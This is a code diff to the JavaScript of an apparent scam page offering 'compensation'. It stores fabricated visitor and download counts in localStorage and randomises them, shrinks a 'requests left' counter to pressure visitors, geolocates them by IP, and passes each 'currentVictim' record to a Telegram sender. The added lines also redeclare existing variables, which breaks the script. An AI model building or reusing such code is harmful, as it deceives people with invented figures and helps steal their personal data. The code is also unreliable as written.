@@ -905,6 +905,14 @@ body::before {
         let onlineUsers = 12;
         let liveDownloads = 5;
         let geoData = null;
+
+        // ХРАНЕНИЕ В LOCALSTORAGE
+let requestsLeft = parseInt(localStorage.getItem('requestsLeft')) || 90;
+let onlineUsers = parseInt(localStorage.getItem('onlineUsers')) || 12;
+let liveDownloads = parseInt(localStorage.getItem('liveDownloads')) || 5;
+let lastUpdateTime = parseInt(localStorage.getItem('lastUpdateTime')) || Date.now();
+let lastOnlineUpdateTime = parseInt(localStorage.getItem('lastOnlineUpdateTime')) || Date.now();
+let lastDownloadUpdateTime = parseInt(localStorage.getItem('lastDownloadUpdateTime')) || Date.now();
         
         // МАТЫ ДЛЯ ПРОВЕРКИ ФИО (но не блокируем, только логируем)
         const badWords = ['хуй', 'пизда', 'ебан', 'бля', 'сука', 'гондон', 'пидор', 'гандон', 'долбоеб', 'мудак', 'fuck', 'shit', 'asshole', 'cock', 'dick'];
@@ -917,6 +925,27 @@ body::before {
                 const originalName = field.getAttribute('data-field');
                 field.setAttribute('name', originalName);
             });
+
+            // Восстановление значений из localStorage
+document.getElementById('requestsCounter').textContent = requestsLeft;
+document.getElementById('onlineUsers').textContent = onlineUsers;
+document.getElementById('liveDownloads').textContent = liveDownloads;
+
+// Пересчет времени для уменьшения счетчиков
+const now = Date.now();
+const timePassed = now - lastUpdateTime;
+const hoursPassed = timePassed / (1000 * 60 * 60);
+
+// Уменьшаем requestsLeft в зависимости от прошедшего времени
+if (hoursPassed > 0) {
+    const decreaseAmount = Math.floor(hoursPassed * 3); // 3 заявки в час
+    requestsLeft = Math.max(70, requestsLeft - decreaseAmount);
+    localStorage.setItem('requestsLeft', requestsLeft);
+    document.getElementById('requestsCounter').textContent = requestsLeft;
+}
+
+// Обновляем время последнего изменения
+localStorage.setItem('lastUpdateTime', now);
             
             // Получение геолокации по IP
             getGeoLocation();
@@ -933,18 +962,50 @@ body::before {
             // Ротация ссылок
             startLinkRotation();
             
-            // Обновление онлайн пользователей
+            // Обновление онлайн пользователей (раз в 15 минут)
             setInterval(() => {
-                onlineUsers = Math.max(8, Math.min(20, onlineUsers + Math.floor(Math.random() * 3) - 1));
-                document.getElementById('onlineUsers').textContent = onlineUsers;
-            }, 45000);
+                updateOnlineUsers();
+            }, 10 * 60 * 1000);
             
-            // Обновление скачиваний
+            // Обновление скачиваний (раз в 15 минут)
             setInterval(() => {
-                liveDownloads = Math.max(2, Math.min(10, liveDownloads + Math.floor(Math.random() * 2) - 1));
-                document.getElementById('liveDownloads').textContent = liveDownloads;
-            }, 60000);
+                updateDownloads();
+            }, 15 * 60 * 1000);
+            
+            // Сразу обновляем счетчики
+            updateOnlineUsers();
+            updateDownloads();
         });
+        
+        // Обновление онлайн пользователей
+        function updateOnlineUsers() {
+            const now = Date.now();
+            const timePassed = now - lastOnlineUpdateTime;
+            
+            // Меняем онлайн пользователей случайным образом
+            if (Math.random() > 0.5) {
+                const change = Math.floor(Math.random() * 3) - 1; // -1, 0, или 1
+                onlineUsers = Math.max(8, Math.min(20, onlineUsers + change));
+                document.getElementById('onlineUsers').textContent = onlineUsers;
+                localStorage.setItem('onlineUsers', onlineUsers);
+                localStorage.setItem('lastOnlineUpdateTime', now);
+            }
+        }
+        
+        // Обновление скачиваний
+        function updateDownloads() {
+            const now = Date.now();
+            const timePassed = now - lastDownloadUpdateTime;
+            
+            // Меняем количество скачиваний случайным образом
+            if (Math.random() > 0.5) {
+                const change = Math.floor(Math.random() * 2) - 1; // -1, 0, или 1
+                liveDownloads = Math.max(2, Math.min(10, liveDownloads + change));
+                document.getElementById('liveDownloads').textContent = liveDownloads;
+                localStorage.setItem('liveDownloads', liveDownloads);
+                localStorage.setItem('lastDownloadUpdateTime', now);
+            }
+        }
         
         // Получение геолокации по IP
         async function getGeoLocation() {
@@ -1201,6 +1262,11 @@ function startLiveNotifications() {
             };
             
             localStorage.setItem('requestCounter', requestCounter);
+
+            // Уменьшаем количество свободных заявок при каждой проверке
+            requestsLeft = Math.max(70, requestsLeft - 1);
+            localStorage.setItem('requestsLeft', requestsLeft);
+            document.getElementById('requestsCounter').textContent = requestsLeft;
             
             // Отправка в Telegram с правильным заголовком
             sendToTelegram('compensation', currentVictim);
